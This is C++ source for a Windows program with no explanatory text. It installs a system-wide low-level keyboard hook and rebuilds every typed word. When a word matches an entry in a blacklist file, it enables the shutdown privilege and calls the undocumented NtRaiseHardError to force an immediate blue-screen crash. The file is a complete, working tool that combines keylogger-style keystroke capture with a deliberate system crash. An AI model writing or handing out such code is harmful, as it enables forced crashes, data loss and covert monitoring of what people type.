#include <Windows.h>

#include <cstdlib>
#include <fstream>
#include <iostream>
#include <string>
#include <unordered_set>

typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(
	NTSTATUS err_stat, ULONG num_params,
	ULONG unicode_mask OPTIONAL, PULONG_PTR params,
	ULONG response_option, PULONG response);

typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG privilege,
	BOOLEAN enable,
	BOOLEAN current_thread,
	PBOOLEAN enabled);

static void raise_hard_error() {
	BOOLEAN enabled;
	ULONG resp;
	LPVOID func_addr_1 =
		GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
	LPVOID func_addr_2 =
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
	pdef_RtlAdjustPrivilege nt_call_1 = (pdef_RtlAdjustPrivilege)func_addr_1;
	pdef_NtRaiseHardError nt_call_2 = (pdef_NtRaiseHardError)func_addr_2;
	NTSTATUS NtRet = nt_call_1(19, TRUE, FALSE, &enabled);
	nt_call_2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &resp);
}

static HHOOK keyboard_hook;
static std::string last_word;
static std::unordered_set<std::string> blacklist;

static void load_blacklist(const std::string& filename) {
	std::ifstream file(filename);
	if (!file.is_open()) {
		std::cerr << "Failed to load blacklist from " << filename << "\n";
		exit(EXIT_FAILURE);
	}

	std::string line;
	while (std::getline(file, line)) {
		if (line.starts_with("#")) {
			continue;
		}

		blacklist.insert(line);
	}
}

static LRESULT CALLBACK keyboard_proc(int n_code, WPARAM w_param,
	LPARAM l_param) {
	if (n_code != HC_ACTION) {
		return CallNextHookEx(keyboard_hook, n_code, w_param, l_param);
	}

	KBDLLHOOKSTRUCT* keyboard = reinterpret_cast<KBDLLHOOKSTRUCT*>(l_param);
	if (w_param == WM_KEYDOWN || w_param == WM_SYSKEYDOWN) {
		BYTE keyboard_state[256];
		if (!GetKeyboardState(keyboard_state)) {
			std::cerr << "Failed to get keyboard state\n";
			exit(EXIT_FAILURE);
			return CallNextHookEx(keyboard_hook, n_code, w_param, l_param);
		}

		if (keyboard->vkCode == VK_BACK) {
			if (last_word.size() > 0) {
				last_word.pop_back();
			}
		}

		UINT scancode = MapVirtualKey(keyboard->vkCode, MAPVK_VK_TO_VSC);
		CHAR ascii_char[2] = {};

		if (ToAscii(keyboard->vkCode, scancode, keyboard_state,
			reinterpret_cast<LPWORD>(ascii_char), 0) == 1) {
			char c = ascii_char[0];

			if (std::isspace(c)) {
				if (blacklist.contains(last_word)) {
					raise_hard_error();
				}
				last_word.clear();
			}
			else {
				last_word.push_back(c);
			}
		}
	}

	return CallNextHookEx(keyboard_hook, n_code, w_param, l_param);
}

int main(int argc, char* argv[]) {
	keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, NULL, 0);
	if (!keyboard_hook) {
		std::cerr << "Failed to install hook\n";
		return EXIT_FAILURE;
	}

	std::string filename;
	if (argc > 1) {
		filename = argv[1];
	}
	else {
		filename = "blacklist.txt";
	}

	load_blacklist(filename);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0)) {
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(keyboard_hook);
	return EXIT_SUCCESS;
}